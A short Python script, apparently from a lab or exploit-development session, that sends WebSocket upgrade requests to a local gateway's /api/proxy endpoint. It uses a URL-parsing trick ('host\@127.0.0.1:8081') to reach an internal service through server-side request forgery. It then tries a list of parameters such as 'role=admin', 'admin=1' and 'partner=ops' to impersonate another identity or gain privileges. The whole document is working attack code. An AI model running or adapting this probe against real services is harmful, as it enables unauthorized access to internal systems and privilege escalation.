import time, select, socket, base64, os
from ws import recv_frame
GW=("127.0.0.1",24606)
INNER="http://rates.partner-forex.example.com\\@127.0.0.1:8081/ws"
def trial(extra, hdrs=None):
    s=socket.create_connection(GW,timeout=8)
    req=(f"GET /api/proxy?url={INNER}{extra} HTTP/1.1\r\nHost: x\r\n"
         "Upgrade: websocket\r\nConnection: Upgrade\r\n"
         f"Sec-WebSocket-Key: {base64.b64encode(os.urandom(16)).decode()}\r\n"
         "Sec-WebSocket-Version: 13\r\n")
    if hdrs:
        for k,v in hdrs.items(): req+=f"{k}: {v}\r\n"
    req+="\r\n"
    s.sendall(req.encode())
    buf=b""
    while b"\r\n\r\n" not in buf:
        c=s.recv(1)
        if not c: break
        buf+=c
    head=buf.decode(errors="replace")
    s.setblocking(False)
    out=[]; end=time.time()+1.0
    while time.time()<end:
        r,_,_=select.select([s],[],[],0.1)
        if r:
            try: out.append(recv_frame(s)[1])
            except Exception: out.append(b"EOF"); break
    s.close(); return head.split("\r\n")[0], out
for e in ["&partner=ops","&identity=ops","&role=ops","&user=ops","&id=ops","&as=ops",
          "&token=ops","&admin=1","&partner=ops&role=admin","&partner_id=ops",
          "&client=ops","&session=ops"]:
    print(e, trial(e))
